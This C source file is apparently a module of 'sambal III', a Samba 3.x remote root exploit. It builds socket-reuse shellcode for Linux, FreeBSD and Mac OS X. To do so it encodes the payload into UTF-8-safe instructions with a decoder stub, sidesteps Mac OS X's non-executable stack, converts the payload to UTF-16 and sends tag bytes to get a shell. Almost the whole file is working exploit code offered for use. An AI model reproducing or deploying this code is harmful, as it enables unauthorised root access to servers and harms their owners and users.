/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iconv.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include "session.h"

#include "ansi.h"
#include "netio.h"
#include "mode.h"
#include "x86_shellcode.h"
#include "x86_freebsd_shellcode.h"
#include "x86_linux_shellcode.h"
#include "x86_mac_os_x_shellcode.h"
#include "x86_utf8_decoder.h"
#include "wrapper.h"

size_t
x86_shellcode_build(char *buffer, size_t length)
{
        unsigned char *temp_buf                 = NULL; 
        unsigned char *utf8_safe                = NULL;
        unsigned char *utf16_encoded            = NULL;
        
        size_t utf8_safe_length                 = 0;
        size_t utf16_encoded_length             = 0;
        size_t buffer_length                    = 0;

        if (MODE_IS_SET(MODE_LINUX)) {

                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Building "LG"x86_linux_pty_findsck"DG" shellcode ... \r\n"NO);

                temp_buf = xmalloc(NOP_PADDING + sizeof(linux_x86_regain_credentials) + sizeof(linux_x86_findsck));

                memset(temp_buf, 0x41, NOP_PADDING);
                memcpy(temp_buf + NOP_PADDING, (void *)&linux_x86_regain_credentials, sizeof(linux_x86_regain_credentials) - 1);
                memcpy(temp_buf + NOP_PADDING + sizeof(linux_x86_regain_credentials) - 1, (void *)&linux_x86_findsck, sizeof(linux_x86_findsck) - 1);

                buffer_length = sizeof(linux_x86_findsck) + sizeof(linux_x86_regain_credentials) + NOP_PADDING;
        }

        if (MODE_IS_SET(MODE_FREEBSD)) {
        
                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Building "LG"x86_freebsd_findsck"DG" shellcode ... \r\n"NO);

                temp_buf = xmalloc(NOP_PADDING + sizeof(freebsd_x86_findsck_shell));
                memset(temp_buf, 0x41, NOP_PADDING);
                memcpy(temp_buf + NOP_PADDING, (void *)&freebsd_x86_findsck_shell, sizeof(freebsd_x86_findsck_shell) - 1);

                buffer_length = sizeof(freebsd_x86_findsck_shell) + NOP_PADDING;
        }       

        if (MODE_IS_SET(MODE_MACOS)) {

                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Building "LG"x86_mac_os_findsck"DG" shellcode ... \r\n"NO);

                temp_buf = xmalloc(NOP_PADDING + sizeof(mac_os_x86_findsck_shell));
                memset(temp_buf, 0x41, NOP_PADDING);
                memcpy(temp_buf + NOP_PADDING, (void *)&mac_os_x86_findsck_shell, sizeof(mac_os_x86_findsck_shell) - 1);

                buffer_length = sizeof(mac_os_x86_findsck_shell) + NOP_PADDING;
        }

        /* The shellcode has to be UTF-8 safe ... */

        x86_shellcode_make_utf8_safe(   temp_buf, 
                                        buffer_length,
                                        &utf8_safe, 
                                        &utf8_safe_length);

        fprintf(stdout, " -  Converting shellcode to UTF-16 ... \r\n");
                
        x86_shellcode_convert_to_utf16( utf8_safe,
                                        utf8_safe_length,
                                        &utf16_encoded,
                                        &utf16_encoded_length);

        fprintf(stdout, " -  Shellcode UTF-16 length is: %u\r\n", utf16_encoded_length);

        memcpy(buffer, utf16_encoded, utf16_encoded_length);

        free(utf8_safe);
        free(utf16_encoded);
        free(temp_buf);

        return utf16_encoded_length;
}

void
x86_shellcode_make_utf8_safe(unsigned char *org_src, size_t src_len, unsigned char **out, size_t *out_len)
{
        size_t dst_len                  = sizeof(x86_utf8_decoder_ret) + (src_len * 20);
        ssize_t cur_byte                = 0;

        unsigned char *src              = xmalloc(src_len + (src_len % 4) + 1);
        unsigned char *dst              = xmalloc(dst_len);
        unsigned char *ptr              = dst;

        unsigned char byte[4]           = { 0 };
        unsigned char byte_delta[4]     = { 0 };
        unsigned char byte_extra[4]     = { 0 };

        int i                           = 0;
        int value                       = MAC_OS_X_SAFE_ADDRESS;

        memset(src, 0x40, src_len + (src_len % 4) + 1);
        memcpy(src, org_src, src_len);

        src_len += src_len % 4;

        if (MODE_IS_SET(MODE_MACOS)) {

                /* Set the stack pointer to another address. This bypasses the non-executable stack on Mac OS X */

                memcpy(&mac_os_x86_utf8_encoder_fix[1], &value, sizeof(value));
                memcpy(ptr, mac_os_x86_utf8_encoder_fix, sizeof(mac_os_x86_utf8_encoder_fix) - 1);
                ptr += sizeof(mac_os_x86_utf8_encoder_fix) - 1;
        }

        for (cur_byte = src_len; cur_byte > 0; cur_byte -= 4) {

                byte[0] = src[cur_byte - 0];
                byte[1] = src[cur_byte - 1];
                byte[2] = src[cur_byte - 2];
                byte[3] = src[cur_byte - 3];

                if (    !(byte[0] & 0x80) && !(byte[1] & 0x80) &&
                        !(byte[2] & 0x80) && !(byte[3] & 0x80)) {

                        *ptr++ = 0x68;          // pushl
                        *ptr++ = byte[3];
                        *ptr++ = byte[2];
                        *ptr++ = byte[1];
                        *ptr++ = byte[0];

                        continue;
                }

                for (i = 0; i < 4; i++) {
                        if (!(byte[i] & 0x80)) {
                                byte[i]         = byte[i];
                                byte_delta[i]   = 0x00;
                                byte_extra[i]   = 0x00;
                        } else {
                                if (byte[i] == 0xff) {
                                        byte[i]         = 0x7F;
                                        byte_delta[i]   = 0x7F;
                                        byte_extra[i]   = 1;
                                } else {
                                       byte[i]         = byte[i] - 0x7F;
                                       byte_delta[i]   = 0x7F;
                                       byte_extra[i]   = 0;
                                }
                        }
                }

                *ptr++ = 0x68;                  // pushl value
                *ptr++ = byte[3];
                *ptr++ = byte[2];
                *ptr++ = byte[1];
                *ptr++ = byte[0];

                *ptr++ = 0x58;                  // popl %eax
                *ptr++ = 0x05;                  // addl value, %eax
                *ptr++ = byte_delta[3];
                *ptr++ = byte_delta[2];
                *ptr++ = byte_delta[1];
                *ptr++ = byte_delta[0];

                if (byte_extra[0] || byte_extra[1] || byte_extra[2] || byte_extra[3]) {

                /* Hopefully this doesn't happen to often. We need an additional addl. */

                        *ptr++ = 0x05;
                        *ptr++ = byte_extra[3];
                        *ptr++ = byte_extra[2];
                        *ptr++ = byte_extra[1];
                        *ptr++ = byte_extra[0];
                }

                *ptr++ = 0x50;                  // pushl %eax

        }

        memcpy(ptr, x86_utf8_decoder_ret, sizeof(x86_utf8_decoder_ret) - 1);
        ptr += sizeof(x86_utf8_decoder_ret) - 1;

        *out            = dst;
        *out_len        = ptr - dst;

        fprintf(stdout, " -  Added UTF-8 decoder. Shellcode length increased from %u to %u bytes.\n", src_len, *out_len);

        return;
}

void
x86_shellcode_convert_to_utf16(unsigned char *src, size_t src_len, unsigned char **out, size_t *out_len)
{
        char *dst       = xmalloc(1 + (src_len + 1) * 4);
        char *inptr     = (char *)src;
        char *outptr    = (char *)dst;

        size_t dst_len  = 1 + (src_len + 1) * 4;

        iconv_t cd      = 0;

        if ((cd = iconv_open("UCS-2", "UTF-8")) == (iconv_t)-1) {
                perror("iconv_open");
                exit(EXIT_FAILURE);
        }

        if (iconv(cd, &inptr, &src_len, &outptr, &dst_len) == (size_t)-1) {
                perror("iconv");
                exit(EXIT_FAILURE);
        }

        if (!dst_len || (errno == EILSEQ) || (errno == EINVAL)) {
                fprintf(stderr, "x86_shellcode_convert_to_utf16: shellcode contains illegal characters!\r\n");
                exit(EXIT_FAILURE);
        }

        if (iconv_close(cd) == -1) {
                perror("iconv_close");
                exit(EXIT_FAILURE);
        }

        *out            = dst;
        *out_len        = dst_len;

        return;
}

int
x86_shellcode_send_tag_linux(int fd)
{
        unsigned char send_buf[1024];

        memset(send_buf, 0x41, sizeof(send_buf));
        memcpy(send_buf, &linux_x86_findsck_tag, sizeof(linux_x86_findsck_tag));
        memcpy(send_buf + sizeof(linux_x86_findsck_tag), &linux_x86_findsck_pty_alloc, sizeof(linux_x86_findsck_pty_alloc));
 
        if (netio_send(fd, send_buf, sizeof(send_buf), 0) != sizeof(send_buf)) {                
                fprintf(stdout, GR"\r\n["LR"!"GR"]"LR" Exploit failed.\r\n"NO);
                exit(EXIT_FAILURE);
        }

        if (netio_check_for_shell(fd) < 0) {
                fprintf(stdout, GR"\r\n["LR"!"GR"]"LR" Exploit failed.\r\n"NO);
                exit(EXIT_FAILURE);
        }

        return 0;
}


int
x86_shellcode_send_tag_freebsd(int fd)
{
        if (netio_send(fd, &freebsd_x86_findsck_tag, sizeof(freebsd_x86_findsck_tag), 0) != sizeof(freebsd_x86_findsck_tag)) {
                fprintf(stdout, GR"\r\n["LR"!"GR"]"LR" Exploit failed.\r\n"NO);
                exit(EXIT_FAILURE);
        }

        return 0;       
}

int
x86_shellcode_send_tag_mac_os(int fd)
{
        if (netio_send(fd, &mac_os_x86_findsck_tag, sizeof(mac_os_x86_findsck_tag), 0) != sizeof(mac_os_x86_findsck_tag)) {
                fprintf(stdout, GR"\r\n["LR"!"GR"]"LR" Exploit failed.\r\n"NO);
                exit(EXIT_FAILURE);
        }

        return 0;       
}
